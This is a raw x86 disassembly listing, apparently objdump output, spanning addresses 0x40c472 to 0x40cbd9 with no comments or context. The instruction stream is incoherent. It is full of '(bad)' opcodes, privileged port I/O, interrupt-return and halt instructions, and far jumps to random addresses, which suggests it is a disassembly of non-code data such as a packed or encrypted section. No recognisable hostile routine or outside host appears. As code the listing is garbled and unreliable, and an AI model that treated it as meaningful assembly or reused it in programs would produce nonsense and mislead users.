  40c472:	mov    ebx,?
  40c474:	add    DWORD PTR [ebx-0x1],ecx
  40c477:	cmp    edi,DWORD PTR [ebp+0x235c3db2]
  40c47d:	pop    ebx
  40c47e:	xor    edx,DWORD PTR [ecx-0x4a]
  40c481:	fwait
  40c482:	pop    ss
  40c483:	stos   DWORD PTR es:[edi],eax
  40c484:	lahf   
  40c485:	nop
  40c486:	iret   
  40c487:	cli    
  40c488:	sub    eax,0x83606999
  40c48d:	add    DWORD PTR [ebx-0x5e1d12df],edx
  40c493:	dec    esp
  40c494:	dec    edx
  40c495:	sub    DWORD PTR [edx-0x1d],ebp
  40c498:	cli    
  40c499:	(bad)  
  40c49a:	call   0x53b998cf
  40c49f:	push   0x95c3b92f
  40c4a4:	sti    
  40c4a5:	mov    ebx,0xaa07f370
  40c4aa:	dec    edx
  40c4ab:	jb     0x40c482
  40c4ad:	mov    esp,DWORD PTR [ecx-0x4a]
  40c4b0:	mov    bl,0xd5
  40c4b2:	and    BYTE PTR [esi],ch
  40c4b4:	mov    dl,0xe9
  40c4b6:	(bad)  
  40c4b7:	jns    0x40c515
  40c4b9:	sahf   
  40c4ba:	jbe    0x40c46f
  40c4bc:	and    bl,BYTE PTR [edx]
  40c4be:	mov    edi,0x9d4a7f14
  40c4c3:	imul   edi,ebx,0xb93157c6
  40c4c9:	fs dec ebx
  40c4cb:	mov    esp,0xfaa329b2
  40c4d0:	mov    ah,0xe1
  40c4d2:	inc    DWORD PTR [ebx-0x53]
  40c4d5:	xchg   ebx,eax
  40c4d6:	test   BYTE PTR [edi-0x5f],ah
  40c4d9:	mov    eax,DWORD PTR [ecx+0x5d]
  40c4dc:	in     al,0xab
  40c4de:	jmp    0x40c4d6
  40c4e0:	xchg   edi,eax
  40c4e1:	ins    BYTE PTR es:[edi],dx
  40c4e2:	not    BYTE PTR [ebx+0x7fbf24]
  40c4e8:	repnz fnstenv [edx+esi*8]
  40c4ec:	test   BYTE PTR [ebx+0xb],bh
  40c4ef:	xlat   BYTE PTR ds:[ebx]
  40c4f0:	jge    0x40c556
  40c4f2:	push   edx
  40c4f3:	xor    eax,0x13b06da7
  40c4f8:	push   ecx
  40c4f9:	js     0x40c4e0
  40c4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4fc:	pop    edx
  40c4fd:	push   edi
  40c4fe:	mov    DWORD PTR [esi+0x5a],esi
  40c501:	lea    esp,[eax+0x77]
  40c504:	jb     0x40c556
  40c506:	test   al,0x94
  40c508:	inc    edx
  40c509:	dec    esi
  40c50a:	repz and DWORD PTR [ecx+0x46],0x416af679
  40c512:	inc    BYTE PTR [ebx+ebx*1+0x726f2426]
  40c519:	in     al,dx
  40c51a:	push   ebp
  40c51b:	fdivr  QWORD PTR [ecx]
  40c51d:	dec    esi
  40c51e:	push   ebp
  40c51f:	popa   
  40c520:	xchg   ebx,eax
  40c521:	addr16 retf 
  40c523:	retf   
  40c524:	dec    DWORD PTR [ebx+ebp*4+0x1e439c37]
  40c52b:	repnz mov edx,0x6ab65c72
  40c531:	loope  0x40c59c
  40c533:	pop    edx
  40c534:	jp     0x40c509
  40c536:	out    dx,eax
  40c537:	(bad)  
  40c539:	ja     0x40c582
  40c53b:	add    BYTE PTR [eax+0x762d075b],0x6b
  40c542:	rol    al,0x30
  40c545:	mov    dl,0x3a
  40c547:	clc    
  40c548:	retf   
  40c549:	mov    WORD PTR [edx],?
  40c54b:	je     0x40c4d4
  40c54d:	sar    BYTE PTR [ecx-0x14db622b],1
  40c553:	xchg   ebp,eax
  40c554:	popa   
  40c555:	ss and dh,ah
  40c558:	sbb    edx,DWORD PTR [edx]
  40c55a:	fiadd  DWORD PTR [edi+ebx*8+0x1c]
  40c55e:	push   0x68
  40c560:	jg     0x40c4fd
  40c562:	xchg   edx,eax
  40c563:	xchg   esi,eax
  40c564:	test   BYTE PTR [edi],0x57
  40c567:	out    dx,al
  40c568:	xchg   ebp,ebx
  40c56a:	sbb    eax,0x55530953
  40c56f:	shl    DWORD PTR [edi],cl
  40c571:	out    0x28,al
  40c573:	popa   
  40c574:	loope  0x40c503
  40c576:	js     0x40c5c8
  40c578:	std    
  40c579:	fisubr WORD PTR [eax]
  40c57b:	mov    edx,0xa606b6ba
  40c580:	out    dx,al
  40c581:	leave  
  40c582:	and    eax,0x4b099cdc
  40c587:	(bad)  
  40c588:	icebp  
  40c589:	lods   al,BYTE PTR ds:[esi]
  40c58a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c58b:	ret    0x5496
  40c58e:	enter  0x8e71,0xf6
  40c592:	aad    0x40
  40c594:	jmp    0x309a7f8a
  40c599:	xchg   esi,eax
  40c59a:	test   eax,0xf0591cdc
  40c59f:	push   0xffffffe4
  40c5a1:	shl    DWORD PTR [eax-0xc2af795],1
  40c5a7:	pusha  
  40c5a8:	jle    0x40c59f
  40c5aa:	test   DWORD PTR [ecx+0x17ff8ef3],eax
  40c5b0:	jle    0x40c549
  40c5b2:	mov    bh,0xae
  40c5b4:	(bad)  
  40c5b5:	xor    eax,DWORD PTR [esi-0xd6a0222]
  40c5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5bc:	cmp    BYTE PTR [ecx],ch
  40c5be:	inc    eax
  40c5bf:	xchg   ch,cl
  40c5c1:	cwde   
  40c5c2:	arpl   WORD PTR [eax-0x7b2876d8],bx
  40c5c8:	adc    al,BYTE PTR [esi]
  40c5ca:	ss repz mov ecx,0xee8c78e1
  40c5d2:	pop    ecx
  40c5d3:	xchg   esi,eax
  40c5d4:	or     DWORD PTR [edi],ebx
  40c5d6:	adc    DWORD PTR [ecx],edi
  40c5d8:	fs cwde 
  40c5da:	in     eax,0xd1
  40c5dc:	push   eax
  40c5dd:	(bad)  
  40c5de:	and    BYTE PTR [ebx+0x3d433dec],ah
  40c5e4:	jae    0x40c5a0
  40c5e6:	mov    al,0xfb
  40c5e8:	adc    dl,bh
  40c5ea:	retf   
  40c5eb:	adc    al,0x10
  40c5ed:	xchg   edx,eax
  40c5ee:	(bad)  
  40c5ef:	mov    dh,0xf0
  40c5f1:	arpl   WORD PTR [edi-0x7e],bp
  40c5f4:	pop    esp
  40c5f5:	push   edi
  40c5f6:	dec    esp
  40c5f7:	push   es
  40c5f8:	sbb    esp,esi
  40c5fa:	push   ecx
  40c5fb:	adc    ebp,ebx
  40c5fd:	jp     0x40c613
  40c5ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c600:	mov    fs,WORD PTR [edi+0x1508e350]
  40c606:	mov    dl,BYTE PTR [ebx]
  40c608:	sbb    DWORD PTR [ecx-0x2494c756],ebp
  40c60e:	xor    ch,ch
  40c610:	in     al,dx
  40c611:	mov    al,0x8a
  40c613:	push   ebp
  40c614:	mov    dl,0xcb
  40c616:	mov    ah,0xe2
  40c618:	jmp    0x40c5c3
  40c61a:	(bad)  
  40c61b:	neg    BYTE PTR [esi]
  40c61d:	jno    0x40c684
  40c61f:	cld    
  40c620:	mov    ch,dh
  40c622:	mov    edx,0xf3b89876
  40c627:	cwde   
  40c628:	daa    
  40c629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c62a:	pop    es
  40c62b:	push   ss
  40c62c:	mov    bh,0x53
  40c62e:	pop    ebp
  40c62f:	std    
  40c630:	inc    ebx
  40c631:	jecxz  0x40c609
  40c633:	enter  0xeaeb,0xc
  40c637:	fldcw  WORD PTR [edx-0x108eeb18]
  40c63d:	rcr    edx,0xca
  40c640:	les    eax,FWORD PTR [ebx-0x1645c99a]
  40c646:	add    al,BYTE PTR [esi-0x1ab45d3]
  40c64c:	dec    esi
  40c64d:	sub    DWORD PTR [ebx-0x56378482],eax
  40c653:	inc    ebp
  40c654:	jg     0x40c666
  40c656:	pop    edx
  40c657:	mov    ebx,DWORD PTR ds:0xe6f0a7ac
  40c65d:	test   eax,0x18b53205
  40c662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c663:	mov    ebp,?
  40c665:	push   eax
  40c666:	in     eax,dx
  40c667:	push   ss
  40c668:	into   
  40c669:	xor    BYTE PTR [eax-0x77fad595],ah
  40c66f:	outs   dx,BYTE PTR ds:[esi]
  40c670:	pop    es
  40c671:	sub    dl,BYTE PTR [esp+esi*1]
  40c674:	mov    edi,0xeef6767a
  40c679:	leave  
  40c67a:	fstp   st(3)
  40c67c:	retf   0x13e4
  40c67f:	adc    DWORD PTR [ebp-0x2d],edx
  40c682:	jecxz  0x40c617
  40c684:	pop    eax
  40c685:	xchg   ecx,eax
  40c686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c687:	jl     0x40c6c2
  40c689:	push   edx
  40c68a:	cmp    ebp,DWORD PTR [eax+0x17d3643a]
  40c690:	imul   ecx,DWORD PTR [edi+0x30],0x49
  40c694:	jbe    0x40c6ce
  40c696:	rol    BYTE PTR ds:0x9ba4f6d3,cl
  40c69c:	xor    bl,BYTE PTR [ebx]
  40c69e:	fcomp  QWORD PTR [eax-0x2f9ec7aa]
  40c6a4:	sub    al,0x61
  40c6a6:	pop    ss
  40c6a7:	inc    edi
  40c6a8:	inc    esi
  40c6a9:	cmp    BYTE PTR [esi+0x29392840],dl
  40c6af:	pop    ebp
  40c6b0:	fstp   QWORD PTR [ebx+0x3ea59eea]
  40c6b6:	xchg   ebx,eax
  40c6b7:	xchg   ecx,eax
  40c6b8:	pushf  
  40c6b9:	arpl   WORD PTR [esi],si
  40c6bb:	mov    eax,0xc2864d93
  40c6c0:	adc    DWORD PTR [ebx+0x5f],0x60d3d001
  40c6c7:	(bad)  
  40c6c8:	cwde   
  40c6c9:	mov    DWORD PTR [ebx],eax
  40c6cb:	lods   al,BYTE PTR ds:[esi]
  40c6cc:	repnz lahf 
  40c6ce:	aad    0x33
  40c6d0:	bsr    dx,si
  40c6d4:	addr16 ds sbb cl,ah
  40c6d8:	adc    dl,BYTE PTR [ecx+ebx*8+0x26]
  40c6dc:	cmp    ebp,eax
  40c6de:	mov    ds:0x21825e53,eax
  40c6e3:	or     BYTE PTR [edi],al
  40c6e5:	jb     0x40c6c8
  40c6e7:	xor    al,0xeb
  40c6e9:	inc    esp
  40c6ea:	pop    ss
  40c6eb:	sub    esi,0xffffff9f
  40c6ee:	add    DWORD PTR [ecx-0x4c7850d9],esp
  40c6f4:	pop    edi
  40c6f5:	add    dl,BYTE PTR [edx]
  40c6f7:	pusha  
  40c6f8:	addr16 jmp 0x3a03daee
  40c6fe:	xchg   ebx,eax
  40c6ff:	pusha  
  40c700:	cmp    DWORD PTR [edx-0x4cd7c42b],eax
  40c706:	add    esp,DWORD PTR [edi]
  40c708:	sahf   
  40c709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70a:	cmc    
  40c70b:	lds    ebp,FWORD PTR [ebp-0x571b50aa]
  40c711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c712:	push   0xd
  40c714:	or     DWORD PTR [eax+0x6b],ebx
  40c717:	aad    0x9
  40c719:	(bad)  
  40c71a:	(bad)  
  40c71b:	in     al,dx
  40c71c:	mov    ebp,ebx
  40c71e:	inc    edi
  40c71f:	and    al,0xf5
  40c721:	mov    esp,0x7de7adcc
  40c726:	repnz cs fs das 
  40c72a:	or     eax,0x9c1b2495
  40c72f:	dec    esi
  40c730:	js     0x40c79b
  40c732:	arpl   WORD PTR [esi-0x26],di
  40c735:	hlt    
  40c736:	fdivr  DWORD PTR [ebx-0x7da7f4d3]
  40c73c:	cmp    al,0x98
  40c73e:	call   0xf04f:0x923126ef
  40c745:	les    ebx,FWORD PTR [esi-0x72]
  40c748:	jno    0x40c6ec
  40c74a:	jecxz  0x40c740
  40c74c:	jle    0x40c7be
  40c74e:	xchg   ebx,eax
  40c74f:	and    DWORD PTR [esi-0x4a],ebx
  40c752:	jmp    DWORD PTR [edx-0x651e6111]
  40c758:	loopne 0x40c787
  40c75a:	sahf   
  40c75b:	jno    0x40c7b8
  40c75d:	shl    BYTE PTR [eax],0xe
  40c760:	ret    
  40c761:	inc    eax
  40c762:	popf   
  40c763:	cmp    eax,0x9d88d54
  40c768:	mov    dl,0x39
  40c76a:	inc    ebx
  40c76b:	jmp    0x936ba726
  40c770:	in     eax,0xa4
  40c772:	jecxz  0x40c7d4
  40c774:	mov    eax,ds:0xe552baad
  40c779:	xchg   ebx,eax
  40c77a:	sbb    BYTE PTR [edx],bh
  40c77c:	sahf   
  40c77d:	dec    ecx
  40c77e:	out    0x9a,al
  40c780:	shl    BYTE PTR [eax+0x74492d39],0x9a
  40c787:	(bad)  
  40c788:	xchg   ebp,eax
  40c789:	retf   0x747a
  40c78c:	ins    DWORD PTR es:[edi],dx
  40c78d:	pop    ebp
  40c78e:	inc    esi
  40c78f:	push   ss
  40c790:	or     ch,bl
  40c792:	add    eax,0xf388deed
  40c797:	enter  0xa133,0xb3
  40c79b:	and    cl,BYTE PTR [esi-0x63]
  40c79e:	hlt    
  40c79f:	dec    edx
  40c7a0:	test   al,0xd7
  40c7a2:	inc    esp
  40c7a3:	mov    edx,esp
  40c7a5:	xchg   dl,cl
  40c7a7:	cmp    ebx,DWORD PTR [ebx]
  40c7a9:	and    esp,DWORD PTR [eax+0x1b2441a9]
  40c7af:	jmp    0xf230:0x9d5a1706
  40c7b6:	jmp    0x8d36d29b
  40c7bb:	push   ebx
  40c7bc:	xchg   esi,eax
  40c7bd:	mov    WORD PTR [esi],fs
  40c7bf:	mov    ch,0x57
  40c7c1:	test   eax,0x83098178
  40c7c6:	sbb    bh,BYTE PTR ds:0x1b321933
  40c7cc:	or     ch,BYTE PTR [esi+0x78]
  40c7cf:	int3   
  40c7d0:	xor    ebx,DWORD PTR [eax-0x68088eb7]
  40c7d6:	sub    DWORD PTR [ebx+eax*1+0x1c],ebp
  40c7da:	pusha  
  40c7db:	scas   al,BYTE PTR es:[edi]
  40c7dc:	jae    0x40c84c
  40c7de:	scas   al,BYTE PTR es:[edi]
  40c7df:	int    0x5b
  40c7e1:	(bad)  
  40c7e2:	mov    eax,DWORD PTR [ebp-0x4149f8e3]
  40c7e8:	jns    0x40c7d6
  40c7ea:	pop    ecx
  40c7eb:	push   ss
  40c7ec:	sahf   
  40c7ed:	xor    ah,BYTE PTR [ebp+0x10]
  40c7f0:	or     BYTE PTR [edi],0xa
  40c7f3:	mov    DWORD PTR ds:0x38afcf4b,esi
  40c7f9:	add    eax,edi
  40c7fb:	and    esp,edi
  40c7fd:	ins    BYTE PTR es:[edi],dx
  40c7fe:	adc    edi,DWORD PTR [edx]
  40c800:	mov    WORD PTR [esi-0x4a],cs
  40c803:	xlat   BYTE PTR ds:[ebx]
  40c804:	imul   esp,DWORD PTR [esi+eax*1-0x31f5b8ef],0x60a00c79
  40c80f:	enter  0xb855,0xf1
  40c813:	bnd jo 0x40c855
  40c816:	adc    edx,esi
  40c818:	arpl   WORD PTR [edx],bx
  40c81a:	(bad)  
  40c81b:	cmp    ah,BYTE PTR [ecx]
  40c81d:	inc    eax
  40c81e:	add    esi,DWORD PTR [ecx+0x56a15b2f]
  40c824:	jno    0x40c85c
  40c826:	sub    eax,0xbd90870a
  40c82b:	mov    BYTE PTR [ebx+0x36c5b835],bl
  40c831:	loop   0x40c887
  40c833:	inc    esi
  40c834:	dec    eax
  40c835:	mov    ebp,0x4fbda1a2
  40c83a:	in     al,0x2b
  40c83c:	jnp    0x40c85c
  40c83e:	xor    eax,0x2d91b442
  40c843:	sbb    eax,DWORD PTR [edi+0x97a174e]
  40c849:	les    edi,FWORD PTR [eax]
  40c84b:	fdiv   DWORD PTR [eax]
  40c84d:	xchg   edx,eax
  40c84e:	mov    ecx,0x308ccb61
  40c853:	stc    
  40c854:	inc    edx
  40c855:	mov    bh,0x6
  40c857:	gs xor eax,0xa108c479
  40c85d:	inc    edi
  40c85e:	pop    esp
  40c85f:	scas   al,BYTE PTR es:[edi]
  40c860:	add    ecx,DWORD PTR [esi+esi*4+0x77d3064b]
  40c867:	dec    esi
  40c868:	in     eax,dx
  40c869:	and    DWORD PTR ds:0xfb5931e8,ebx
  40c86f:	sub    DWORD PTR [ebx-0x3c45dcbe],esi
  40c875:	ret    0xe0c0
  40c878:	xchg   edi,eax
  40c879:	and    al,0xf7
  40c87b:	push   edi
  40c87c:	dec    ebp
  40c87d:	(bad)  
  40c87e:	fmul   QWORD PTR [eax+0x3d77aebe]
  40c884:	cmp    edi,DWORD PTR [ecx+0x60]
  40c887:	pusha  
  40c888:	stos   DWORD PTR es:[edi],eax
  40c889:	ins    BYTE PTR es:[edi],dx
  40c88a:	and    eax,ecx
  40c88c:	or     cl,bh
  40c88e:	mov    cl,0xf7
  40c890:	(bad)  
  40c891:	jle    0x40c85a
  40c893:	sub    BYTE PTR [ecx],cl
  40c895:	pop    edi
  40c896:	jns    0x40c828
  40c898:	and    DWORD PTR [eax+0x56f495c8],edi
  40c89e:	(bad)  
  40c89f:	lea    esp,[edx-0x31]
  40c8a2:	ins    BYTE PTR es:[edi],dx
  40c8a3:	jle    0x40c885
  40c8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a6:	jge    0x40c87b
  40c8a8:	jno    0x40c8ab
  40c8aa:	mov    esp,0x3513b933
  40c8af:	add    DWORD PTR [eax-0x125a1249],ecx
  40c8b5:	sub    eax,0x7160a00d
  40c8ba:	xchg   esi,eax
  40c8bb:	adc    ch,dh
  40c8bd:	cmp    BYTE PTR [ebp+0x60],dl
  40c8c0:	outs   dx,BYTE PTR ds:[esi]
  40c8c1:	cdq    
  40c8c2:	mov    bl,BYTE PTR [ebx]
  40c8c4:	mov    ecx,0xb5eaaeec
  40c8c9:	loopne 0x40c90c
  40c8cb:	sub    BYTE PTR [edx],0x3b
  40c8ce:	or     BYTE PTR [ebp-0x42cf6d96],0x67
  40c8d5:	dec    eax
  40c8d6:	sbb    eax,0x849113ad
  40c8db:	sar    DWORD PTR [ebx],1
  40c8dd:	aas    
  40c8de:	test   eax,ecx
  40c8e0:	xor    ebp,ebx
  40c8e2:	jle    0x40c904
  40c8e4:	out    dx,al
  40c8e5:	sbb    eax,0x1ffbb48c
  40c8ea:	lock pop edi
  40c8ec:	les    edx,FWORD PTR [esi]
  40c8ee:	push   esp
  40c8ef:	pop    eax
  40c8f0:	je     0x40c904
  40c8f2:	sbb    dl,dl
  40c8f4:	inc    esp
  40c8f5:	inc    esp
  40c8f6:	push   ecx
  40c8f7:	sub    eax,0x5e5448ae
  40c8fc:	sahf   
  40c8fd:	adc    bh,BYTE PTR [edi]
  40c8ff:	dec    edi
  40c900:	popf   
  40c901:	mov    ah,ah
  40c903:	push   ecx
  40c904:	lahf   
  40c905:	test   BYTE PTR [eax+eiz*4+0x55],al
  40c909:	scas   al,BYTE PTR es:[edi]
  40c90a:	mov    ebp,0x2b6cffd4
  40c90f:	cmp    dl,BYTE PTR [edx-0xd]
  40c912:	sub    DWORD PTR [ebx+0x4c93efdb],0xe5433003
  40c91c:	jp     0x40c922
  40c91e:	adc    DWORD PTR [edi+ebx*2+0xccfd04d],edx
  40c925:	addr16 inc eax
  40c927:	nop
  40c928:	jg     0x40c8b2
  40c92a:	pop    ebp
  40c92b:	(bad)  
  40c92c:	sub    BYTE PTR [edi-0x420ad78d],ah
  40c932:	popf   
  40c933:	lea    edx,[ebx]
  40c935:	jns    0x40c8be
  40c937:	mov    ebp,0xf6d279b3
  40c93c:	and    ch,bl
  40c93e:	mov    edi,0x88bb0232
  40c943:	add    BYTE PTR [ecx-0x52],ah
  40c946:	je     0x40c99d
  40c948:	mov    al,0x29
  40c94a:	dec    esp
  40c94b:	and    ebp,esp
  40c94d:	fstp   TBYTE PTR [ebp+eiz*1+0x5fc087fc]
  40c954:	out    0x18,eax
  40c956:	fimul  WORD PTR [ecx+0x6e2f3dd1]
  40c95c:	inc    edi
  40c95d:	or     ah,bl
  40c95f:	and    edx,DWORD PTR [edx-0x46538928]
  40c965:	icebp  
  40c966:	push   esi
  40c967:	xlat   BYTE PTR ds:[ebx]
  40c968:	cmpxchg BYTE PTR [eax],dl
  40c96b:	enter  0xa93f,0xbe
  40c96f:	addr16 push es
  40c971:	add    eax,0x48d934f6
  40c976:	ret    0x8c17
  40c979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c97a:	jbe    0x40c987
  40c97c:	loop   0x40c9b9
  40c97e:	pop    ds
  40c97f:	and    eax,0x1b4de18a
  40c984:	fcmove st,st(2)
  40c986:	pop    ebp
  40c987:	ja     0x40c95e
  40c989:	test   al,0x9b
  40c98b:	outs   dx,BYTE PTR es:[esi]
  40c98d:	cmp    al,0x42
  40c98f:	call   FWORD PTR [eax-0x648072ee]
  40c995:	inc    ebx
  40c996:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40c998:	icebp  
  40c999:	retf   0x39d9
  40c99c:	add    DWORD PTR [ebp+0x568be0b3],0x1e064bc6
  40c9a6:	xchg   ecx,eax
  40c9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9a8:	add    bl,dl
  40c9aa:	mov    edi,0xb2e00fc1
  40c9af:	add    ecx,esp
  40c9b1:	je     0x40c94c
  40c9b3:	mov    al,0x8f
  40c9b5:	(bad)
  40c9b8:	cmc    
  40c9b9:	push   esp
  40c9ba:	les    edx,FWORD PTR ds:0xa6dd4173
  40c9c0:	or     BYTE PTR [edx+edx*4-0x770f272b],ah
  40c9c7:	arpl   WORD PTR [ecx+esi*1],dx
  40c9ca:	mov    ss,WORD PTR [ebx+0x65]
  40c9cd:	cmp    ch,BYTE PTR [ebx-0x1bc46bc4]
  40c9d3:	call   0x382d1609
  40c9d8:	je     0x40ca07
  40c9da:	inc    edx
  40c9db:	out    0xef,eax
  40c9dd:	mov    ds:0x2d8ed390,eax
  40c9e2:	mov    dl,0x97
  40c9e4:	shl    BYTE PTR [esi],cl
  40c9e6:	inc    esp
  40c9e7:	stos   DWORD PTR es:[edi],eax
  40c9e8:	jge    0x40c990
  40c9ea:	outs   dx,BYTE PTR ds:[esi]
  40c9eb:	aam    0xca
  40c9ed:	xor    eax,0xb519dc04
  40c9f2:	loopne 0x40ca2b
  40c9f4:	(bad)  
  40c9f6:	popa   
  40c9f7:	mov    ecx,0x3772d1a7
  40c9fc:	or     bl,dl
  40c9fe:	xlat   BYTE PTR ds:[ebx]
  40c9ff:	mov    ebx,0x93998534
  40ca04:	xchg   ebp,eax
  40ca05:	push   cs
  40ca06:	xchg   ebx,eax
  40ca07:	mov    bh,0xe0
  40ca09:	(bad)  [esi]
  40ca0b:	fsubr  QWORD PTR [edx-0x7f]
  40ca0e:	fs push ds
  40ca10:	push   edx
  40ca11:	jbe    0x40ca28
  40ca13:	(bad)  
  40ca14:	mov    ebp,0x86f1afb
  40ca19:	in     al,dx
  40ca1a:	in     al,dx
  40ca1b:	lea    eax,[ebp-0x3e629cc0]
  40ca21:	neg    BYTE PTR [ebx+ebp*2-0x3649978e]
  40ca28:	jnp    0x40ca0f
  40ca2a:	mov    ecx,DWORD PTR [esi]
  40ca2c:	test   bh,0x0
  40ca2f:	lahf   
  40ca30:	inc    edi
  40ca31:	add    eax,0x613c03bd
  40ca36:	dec    esp
  40ca37:	cdq    
  40ca38:	fs inc esi
  40ca3a:	add    ch,BYTE PTR [edx]
  40ca3c:	pop    ss
  40ca3d:	fiadd  DWORD PTR [edi-0x29]
  40ca40:	pusha  
  40ca41:	mov    BYTE PTR [ebx-0x4c207b72],al
  40ca47:	jg     0x40ca2d
  40ca49:	popf   
  40ca4a:	test   eax,0xcc04e072
  40ca4f:	xchg   ebx,eax
  40ca50:	cmp    ch,0x19
  40ca53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca54:	sar    DWORD PTR [eax],1
  40ca56:	in     eax,dx
  40ca57:	push   edx
  40ca58:	retf   
  40ca59:	inc    edx
  40ca5a:	call   0xe4b3cf8f
  40ca5f:	add    DWORD PTR [esp+ebx*1+0xbdd908f],edi
  40ca66:	dec    ecx
  40ca67:	sahf   
  40ca68:	dec    edx
  40ca69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca6a:	pushf  
  40ca6b:	gs test al,0x31
  40ca6e:	mov    esi,?
  40ca70:	or     DWORD PTR [ebp-0x64],ebx
  40ca73:	push   edi
  40ca74:	jbe    0x40ca6a
  40ca76:	fdiv   st,st(4)
  40ca78:	dec    ebp
  40ca79:	call   0x20c40154
  40ca7e:	addr16 add eax,0x50b2990d
  40ca84:	arpl   cx,dx
  40ca86:	add    eax,0x33afb23b
  40ca8b:	dec    esi
  40ca8c:	enter  0xb68a,0x35
  40ca90:	xor    DWORD PTR [ebx],ecx
  40ca92:	dec    edx
  40ca93:	jmp    0xb772:0xf63dafdf
  40ca9a:	repz sahf 
  40ca9c:	hlt    
  40ca9d:	jmp    0xf4e:0x6ef53d33
  40caa4:	mov    ds:0xeadb609e,al
  40caa9:	loope  0x40cb21
  40caab:	and    bl,BYTE PTR [edx+0x28]
  40caae:	push   esi
  40caaf:	mov    bl,BYTE PTR [ebp+0x115e081a]
  40cab5:	lds    edx,FWORD PTR [edx+edi*8]
  40cab8:	cmp    bl,BYTE PTR [esi]
  40caba:	jnp    0x40cb17
  40cabc:	int3   
  40cabd:	mov    eax,ds:0x8474893c
  40cac2:	ins    DWORD PTR es:[edi],dx
  40cac3:	sub    al,0x10
  40cac5:	arpl   WORD PTR [ebx],dx
  40cac7:	adc    eax,0x95937e13
  40cacc:	in     eax,0x56
  40cace:	psrad  mm3,QWORD PTR [esi-0x5a4e890b]
  40cad5:	and    ecx,ebp
  40cad7:	or     BYTE PTR [edi-0x91410c2],bh
  40cadd:	xor    BYTE PTR [eax+0x1dcd6d3e],ch
  40cae3:	jmp    0xaa6c:0xc0548131
  40caea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caeb:	adc    dh,BYTE PTR [ebx+0x3188b1c3]
  40caf1:	call   0x5256:0xb81cba41
  40caf8:	call   0x51a4:0x1bfcb45a
  40caff:	leave  
  40cb00:	sub    BYTE PTR [edi],ah
  40cb02:	xchg   esp,eax
  40cb03:	lds    ebp,FWORD PTR [ebp*4+0x7e5d5747]
  40cb0a:	sbb    ch,BYTE PTR [edx]
  40cb0c:	ror    ebx,1
  40cb0e:	nop
  40cb0f:	fist   WORD PTR [esi-0xf]
  40cb12:	mov    ecx,0x52b70a6
  40cb17:	es scas al,BYTE PTR es:[edi]
  40cb19:	rol    BYTE PTR [ecx],1
  40cb1b:	mov    WORD PTR ds:[ecx],ds
  40cb1e:	mov    ah,0xed
  40cb20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb21:	(bad)  
  40cb23:	xchg   esp,eax
  40cb24:	mov    ch,0xd9
  40cb26:	loope  0x40cae8
  40cb28:	pop    ebp
  40cb29:	imul   edx,DWORD PTR [ecx+0x3eb5b1ec],0x4a
  40cb30:	pop    ebx
  40cb31:	jmp    0x1b5ef97d
  40cb36:	ins    DWORD PTR es:[edi],dx
  40cb37:	in     al,0x93
  40cb39:	sub    al,0x84
  40cb3b:	jb     0x40cbae
  40cb3d:	(bad)  
  40cb3e:	and    BYTE PTR [eax+0x3f],0x63
  40cb42:	out    0xdd,al
  40cb44:	jne    0x40caec
  40cb46:	push   ebp
  40cb47:	mov    edx,0x76943107
  40cb4c:	add    eax,0xade87b20
  40cb51:	lods   eax,DWORD PTR ds:[esi]
  40cb52:	mov    eax,edx
  40cb54:	nop
  40cb55:	sbb    dl,0x53
  40cb58:	aad    0x46
  40cb5a:	add    al,0x57
  40cb5c:	test   eax,0xa19f248d
  40cb61:	pop    ds
  40cb62:	rcr    BYTE PTR [ecx],1
  40cb64:	adc    dl,cl
  40cb66:	int3   
  40cb67:	or     DWORD PTR [edi],edi
  40cb69:	pop    ecx
  40cb6a:	push   esp
  40cb6b:	addr16 ja 0x40cb89
  40cb6e:	pop    eax
  40cb6f:	cmp    DWORD PTR [edi-0x6c],edi
  40cb72:	mov    ah,0xe1
  40cb74:	dec    eax
  40cb75:	ins    BYTE PTR es:[edi],dx
  40cb76:	pop    edi
  40cb77:	sahf   
  40cb78:	mov    bh,0xcb
  40cb7a:	bound  edx,QWORD PTR [ecx+0x56]
  40cb7d:	aad    0xfb
  40cb7f:	add    al,0x85
  40cb81:	iret   
  40cb82:	add    dl,BYTE PTR [ebx]
  40cb84:	fcmovne st,st(0)
  40cb86:	mov    ah,0x3
  40cb88:	lods   eax,DWORD PTR ds:[esi]
  40cb89:	popa   
  40cb8a:	add    eax,0x41adfb94
  40cb8f:	push   eax
  40cb90:	pop    es
  40cb91:	and    cl,BYTE PTR [eax-0x6e1b0a68]
  40cb97:	mov    bh,0x32
  40cb99:	aas    
  40cb9a:	or     BYTE PTR [esi],ah
  40cb9c:	jae    0x40cc07
  40cb9e:	cli    
  40cb9f:	sbb    BYTE PTR [ecx+0x6d],ch
  40cba2:	xor    eax,0x41a7d144
  40cba7:	add    al,0x9f
  40cba9:	or     esp,DWORD PTR [ebx-0x763d425b]
  40cbaf:	fmul   DWORD PTR [edx-0x68]
  40cbb2:	sub    BYTE PTR [ecx-0x5be5c0a9],ch
  40cbb8:	inc    esi
  40cbb9:	mov    esp,0x5ad886bf
  40cbbe:	xor    bh,0xd6
  40cbc1:	pop    es
  40cbc2:	fdivr  DWORD PTR [ebp+0x3c]
  40cbc5:	inc    esp
  40cbc6:	mov    ecx,0xaddc060d
  40cbcb:	xor    DWORD PTR [eax+0x1fa4ad5],esi
  40cbd1:	sub    esp,esp
  40cbd3:	stos   BYTE PTR es:[edi],al
  40cbd4:	mov    eax,0x7905edce
  40cbd9:	test   DWORD PTR [edx-0x9108330],edi
